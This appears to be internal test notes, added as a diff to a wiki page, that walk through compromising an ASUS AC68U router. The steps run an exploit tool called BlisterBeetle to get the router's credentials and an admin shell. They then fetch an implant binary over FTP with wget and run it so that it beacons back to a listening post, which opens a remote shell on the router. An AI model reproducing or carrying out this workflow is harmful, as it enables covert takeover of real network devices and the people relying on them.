@@ -1,0 +1,65 @@
+
+                        Owner: User #1179928
+JQJPRIZE - ASUS AC68U
+Setup / Test ASUSComputer manufacturer AC68U with ARM5 configured Cannoli 2.0 using BlisterBettle (1/30 - 1/31/16)
+
+Connect ASUSComputer manufacturer AC68U WANWide Area Network side to VLANVirtual Local Area Network 610 for Cannoli WANWide Area Network (DHCPDynamic Host Configuration Protocol)
+Connect ASUSComputer manufacturer AC68U LANLocal Area Network side to VLANVirtual Local Area Network 611 for Cannoli LANLocal Area Network side (DHCPDynamic Host Configuration Protocol from DUTDevice Under Test 192.168.1.0/24)Cannoli-lan-1 VMVirtual Machine should obtain a 192.168.1.0/24 IP address from the AC68U
+
+
+On Cannoli LP:
+Unzipped Cannoli 2.0 zip in: /home/ndb/prize2/
+In /bin/ folder, copied the .cfg example file and make a prize-config.cfg file with the LPListening Post IP as the #1 LPListening Post (172.20.13.50)
+Run the following command to create client & server files: ./CCT ../bin/arm5-32-LE-static/client/client prize-client ../bin/arm5-32-LE-static/server/server prize-server prize-config.cfg
+
+
+
+
+On LANLocal Area Network VM
+Put BlisterBeetle installer script on LANLocal Area Network VMVirtual Machine in /home/ndb/prize
+Also scp'd "prize-client" to the same folder above
+Installed BlisterBeetle library files from #/home/ndb/prize/BlisterBeetle_v1.0/BIN/Unclassified/Dependancies/Go to each folder and run "python setup.py install" to install all the BlisterBeetle dependancies
+
+From /home/ndbprize/BlisterBeetle_v1.0/BIN/Unclassified#
+Run: python blister_beetle.pyBlisterBeetle returns target model, default IP of 192.168.1.1, Firmware version, creds
+
+Run: python blister_beetle.py -shell
+BlisterBeetle drops you to an admin shell on the AC68U
+cd to /tmp directory on AC68U
+
+
+With the LANLocal Area Network side computer setup with HTTP/FTP access and the prize-client file on the FTPFile Transfer Protocol root folder (/var/ftp), run the following command to upload the prize-client file to the AC68Uwget ftp://192.168.1.4/prize-client
+
+Once prize-client has uploaded, change the permissions#chmod 755 prize-client
+
+With LPListening Post listening (directions below) start the prize-client on the AC68U/tmp# ./prize-client -b &
+
+
+
+
+
+
+From Cannoli LP:
+
+With the "./prize-server 9000" already running on the LP... implant beacons back with it's source IP of 172.20.100.254
+Beacon was originally set to beacon every 60 seconds
+Modify shell.sh example script to set taget_mac to WANWide Area Network mac address (Impant ID) of ASUS
+Issued "./shell.sh" command after this to get a shell once the target beacons back again.
+type "ls" at new shell prompt and the file system on target is seen
+native shell commands are available
+
+
+
+
+
+More test notes located on 10.9.8.21/Share/Testing/JQJPRIZE/QRC_2016_01_29
+
+
+
+Previous versions:
+| 1 empty
+| 2 
+| 3 
+| 4 
+|
+                    
